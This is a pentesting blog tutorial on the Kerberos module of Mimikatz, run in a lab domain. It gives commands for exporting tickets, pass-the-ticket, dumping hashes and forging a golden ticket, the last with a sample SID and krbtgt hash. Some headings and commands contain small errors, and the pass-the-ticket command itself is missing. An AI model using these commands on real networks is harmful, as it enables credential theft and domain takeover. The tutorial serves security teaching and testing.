<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">MimiKatz for Pentester: Kerberos</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mimikatz-for-pentester-kerberos/" rel="bookmark"><time class="entry-date published" datetime="2022-07-11T16:51:29+00:00">July 11, 2022</time><time class="updated" datetime="2025-05-13T08:17:52+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>Mimikatz for Pentester</strong>: Kerberos is a powerful tool used in penetration testing to exploit vulnerabilities in the Kerberos authentication protocol. In this article, we will explore how to use Mimikatz for extracting Kerberos tickets, generating Golden Tickets, and performing Pass the Ticket attacks. Whether you’re a cybersecurity enthusiast or a seasoned pentester, this guide will provide valuable insights into leveraging Mimikatz for advanced Kerberos exploitation techniques.</span></p>
<p><span style="color: #000000;">This write-up will be part of a series of articles on the tool called Mimikatz which was created in the programming language C. it is mostly used for extracting Kerberos ticket from the memory and generating golden tickets.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Kerberos list</span></li>
<li><span style="color: #000000;">Kerberos list /export</span></li>
<li><span style="color: #000000;">Kerberos ppt ticket.kirbi</span></li>
<li><span style="color: #000000;">Kerberos tgt</span></li>
<li><span style="color: #000000;">Kerberos ask</span></li>
<li><span style="color: #000000;">Kerberos hash</span></li>
<li><span style="color: #000000;">Kerberos golden</span></li>
<li><span style="color: #000000;">Kerberos ptc</span></li>
<li><span style="color: #000000;">Kerberos clist</span></li>
<li><span style="color: #000000;">Kerberos purge</span></li>
</ul>
<p><span style="color: #000000;">In this scenario, we will be using Mimikatz inside the client machine to find out tickets available within the client system.</span></p>
<h3><span style="color: #800000;">Kerberos list</span></h3>
<p><span style="color: #000000;">We will use the command: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list</pre>
<p><span style="color: #000000;">This list command will display all the tickets available on the client machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTW8qEyjWivBVwqSZko5NNLNyPO5efU5EpDaJa1wrXOVis3vmy4m7JnQqYt-QnNTEp9ojbKNWWEqiO32OpbJrfD2CEUg3voGTZWlPpDDVB_3AULKRYBOPpLJ_wM0OFoB_5bFaXDbNxMZ3nsRludJn0G1gZ8sv8ws3ddoINhEyOWYshHjsmmQ1y1wjReg/s16000/1.png"/></span></p>
<p><span style="color: #000000;">As you can see from the above screenshot, there are 2 tickets within our client machine. The list command will provide information such as:</span></p>
<ol>
<li><span style="color: #000000;">Start/End time of ticket</span></li>
<li><span style="color: #000000;">Server name</span></li>
<li><span style="color: #000000;">Client name</span></li>
<li><span style="color: #000000;">and the Flag</span></li>
</ol>
<h3><span style="color: #800000;">Kerberos list /export</span></h3>
<p><span style="color: #000000;">Now once this information has been available and if we want to save those for future use or reference, we will use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list /export</pre>
<p><span style="color: #000000;">This will save the above TGT tickets in the Mimikatz folder in the kirbi<strong> format</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiIkGqyvqFMenygH4KHaIoJMREsOFyKY8XNkWNjbg9KKfBFjcVhG81ynvTFfjvS-fgozaWP5t7I9iKuG-xCYZH_ZicoriMWWPz8X0f_cI8jUtlETOeaTf2xtiQlWuvEqwdEIHkF5hzBMcFW7suc3xNnyK5EhiTNQZo4erme4ygF6tNQdSrfbkWLRyNj8g/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Now that the ticket has been saved in the Mimikatz folder, we renamed it to<strong> ticket.kirbi</strong> for ease of use. Note that this is not a mandatory process.</span></p>
<p><span style="color: #000000;">Since we have this ticket, we will now see how it can be used later on for lateral movement so that we can perform the pass-the-ticket attack.</span></p>
<p><span style="color: #000000;">To perform the pass the ticket attach (ptt) we will issue the following command:</span></p>
<h3><span style="color: #800000;">Kerberos ppt ticket.kirbi</span></h3>
<p><span style="color: #000000;">Once you execute the command successfully, you can issue another command, <strong data-start="158" data-end="171">misc::cmd</strong>, to open a command prompt session. Additionally, as you can see, the command prompt session has opened with the domain user <strong data-start="296" data-end="312">ignite\aarti.</strong></span></p>
<p><span style="color: #000000;">Let’s try to browse the directory of the server with the user aarti by typing the following command in the command prompt:</span></p>
<p><span style="color: #000000;"><strong>dir \\192.168.1.188\c$ </strong>(192.168.1.188 is the server IP address)</span></p>
<p><span style="color: #000000;">As you can see, we can view all the directories of the server.</span></p>
<p><span style="color: #000000;">So, being a non-administrator domain account, the user Aarti was able to check the directory of the C drive of the server by using a PTT attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguLzjT2RdAh94Odvlluz5Jktra4gtn7jPjXVBMxlJFGeIDhY_XG1-f3a5rZmQJ6_me42CF_2J42-VEnp5gcLniSGMz4gQ0cxwBSNhSzBD2899ze3eiV6ketXxWKOcHO1rQwhGiSP6VZdL8jdL-2K15uUUCM6aBgmNU-O31jVQSu0IFRF0JwBlZZktmXw/s16000/3.png"/></span></p>
<h3><span style="color: #800000;">Kerberos TGT</span></h3>
<p><span style="color: #000000;">To display all TGT (Ticket Granting Ticket), we can use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::tgt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH55LEUZQBls7QQXjNFth-16XvOBXjyxMPrgQnzwWCZSTABcreFNZind-1Xkfyyq0n4xi1wOkcvK0W1mjV35KdKy0ooF2iCGNfWy2haRExTVq-XRM_WdZEjWloXZdhVDyYNStpre2LE0YU_1UAIBaOZI8yKc9fIgQQr7i785BziJ2gx9URuK6AI--RSw/s16000/4.png"/></span></p>
<h3><span style="color: #800000;">Kerberos ASK</span></h3>
<p><span style="color: #000000;">It helps you to access the service ticket. The syntax for running this command is as follows:</span></p>
<p><span style="color: #000000;">Kerberos::ask /target/spn name ,where spn name is cifs:/dc1.ignite.local</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ask /target:cifs/dc1.ignite.local</pre>
<p><span style="color: #000000;">To display all the service tickets, we issue the command: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list</pre>
<p><span style="color: #000000;">As we can see, we have 3 tickets listed below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjnGeM1JinysuEUISOyGvRfxwEympUpIQLI5dAhvrvPs1CSngp-Dl93FmLalccCLWmwVWA2QvjWITzFbia3eKmGQ1FS7qwzDARJ1BitQFEtvJjrqtyt_AkXbeP3fXdPF65QTlPCZmQdzp68ajswzjM6qUM3ls37V6esZLY9l-LuGRXOw_us_fRv1bcAQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;">Kerberos Hash</span></h3>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::hash</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgF9jznzEbGQrfICFDxBh3c1wId4OXGczV2VOc3yS4v6ixlGre0ejDgYmG3xQCCGheatB5RQN6LYABPH9AbfFn91FhYdU9gnUp6m1lveS6kAGUaWIsbLDhCxHl9LwoCnDmuLbjAgJbVTGnv7Eimx0yu4yqYVsXZ4MXbrCMsmGxXh-FVWhaijDEwM2e17Q/s16000/6.png"/></strong></span></p>
<p><span style="color: #000000;">This will dump all hashes available on the client machine.</span></p>
<h3><span style="color: #800000;">Kerberos Golden</span></h3>
<p><span style="color: #000000;">Golden Ticket Attack (GTA)</span></p>
<p><span style="color: #000000;">Golden Tickets are forged Ticket-Granting Tickets (TGTs), also called authentication tickets. Some basic information needed to perform this attack are:</span></p>
<ol>
<li><span style="color: #000000;">Domain name: ignite.local</span></li>
<li><span style="color: #000000;">SID: S-1-5-21-1255168540-3690278322-1592948969</span></li>
<li><span style="color: #000000;">KRBTGT Hash: 5cced0cb593612f08cf4a0b4f0bcb017</span></li>
<li><span style="color: #000000;">And an impersonate user: raaz</span></li>
</ol>
<p><span style="color: #000000;">So if we have the domain name, the SID and the hash value of krbtgt, then we can go for pass the ticket attack by generating a fake golden ticket attack.</span></p>
<p><span style="color: #000000;">So the command for performing GTA is as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::golden /user:raaz /domain:ignite.local /sid S-1-5-21-1255168540-3690278322-1592948969 /krbtgt: 5cced0cb593612f08cf4a0b4f0bcb017 /id:500 /ptt</pre>
<p><span style="color: #000000;">Where the id:500 is for administrator privilege</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjS6RBlJGmZ0ZOg-hoYLAUwU2ZTHXXk56Unx12kEh9a8wiG0D3kBd45Ef_o4z_qRmgyssm4PsImPuvKiwvFbnB0ubzLvridF4M0oyPWJc18hUG9ozRUlDN8WktAf0mKcyRcIhn2JSeS3IZKLEI0yvm5NREq59y8DaWMW10ebFWzjNJSmfzOSqVjoUI6yQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">As shown above, the command has been completed successfully. Now let’s launch the command prompt via Mimikatz by issuing the command: misc::cmd</span></p>
<p><span style="color: #000000;">Via the new command prompt, we will be able to access the server directories same as in previous examples.</span></p>
<p><span style="color: #000000;">Another method of golden ticket attack can be performed by using the tool impacket.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUzBhCTAVUWqCUaN5oiwsVr5vI82POBVYuWv_IjbefsOKS1i69XSObZKNkFxVC9INlbD2aZHCVlKGMiYx8Tca6koDSpfTk45dW12FRFU1MYAkUtQCRY8TYKHRtBl1UpJclpUUpA_iFS8-DTkHAIQxOrUpVlzKkrYKJkvzYZwpEYwv-ZyI1e6fHsyzveg/s16000/8.png"/></span></p>
<p><span style="color: #000000;">When using Mimikatz or Rubeus, they will generate the ticket in .kirbi format file. But if we use impacket for golden ticket attack so that we can get the ticket, it will not give you ticket in kirbi format. It will give you the ticket in .ccache format.</span></p>
<h3><span style="color: #800000;">Kerberos ptc</span></h3>
<p><span style="color: #000000;">So if we have the ticket in ccache format, then we can perform the pass the ccache as shown below. Command is: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ptc Administrator.ccache</pre>
<p><span style="color: #000000;">The <strong>misc::cmd</strong> will open a new command prompt via which we will be able to access the server directories, same as our previous examples.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLpdxmy-qzaPx-okk6o5AfRLm5CBSJ1FxTXGMTzwS_TdJsQNN4jkhbEwCYrLAZLfA0Vyfldb311NjkE3WayMr4dgx7ZJj2J7gDGMhZ93lveaKsqKOc-W0dmjI4hxrzk46QXRKOHlgcymCjQmlRtmG1DOWbwgxjPlz99y1APcwEiNEZ2Gsp0pg03ivV3Q/s16000/9.png"/></span></p>
<h3><span style="color: #800000;">Kerberos clist</span></h3>
<p><span style="color: #000000;">If we want to list all the ccache files that exist on the client system, we use the following command: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::clist Administrator.cache</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRM3fHORKs08YzG3KKthRc1n2flpts_1qwnEEzvU0ECHW8Jb7fGOjgRmybtZK_2bhBcfPmLIoYqcX3SKZEXstbYAUv4J58arH9vi9i-P-XKL6lBuGoKTWFUI27asGvb1kqhhXFn5U-TYjpv9Y9cuO3r9gfcQZ9yCuYoW1IsAQh1V0d3td0YR8OHygGUA/s16000/10.png"/></span></p>
<h3><span style="color: #800000;">Kerberos purge</span></h3>
<p><span style="color: #000000;">If we want to delete all the tickets, either ccache or kirbi format, we can use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::purge</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEuduJhgj6WcmAoVI7bGcBQ7HzCropyj8XQpa5PTYiFf6q8k-mWhfUz2UUetduxBbSHN5KsybfWpyR-V3q0h0yKkjp4bCst1b1fONq3KtUtyQYloBVnxekMSCq_6iKAg_gyyeb_3oMjuX5XsIrwb93UcOwACxB5Kr3bTyNvyQgLnVEHrMnhDXpkzptpQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">In conclusion, Mimikatz for Pentester: Kerberos offers essential techniques for extracting and manipulating Kerberos tickets, enabling effective exploitation of authentication weaknesses. By mastering these methods, pentesters can enhance their ability to identify and address vulnerabilities in network security.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Can be Contacted on</span> <a href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
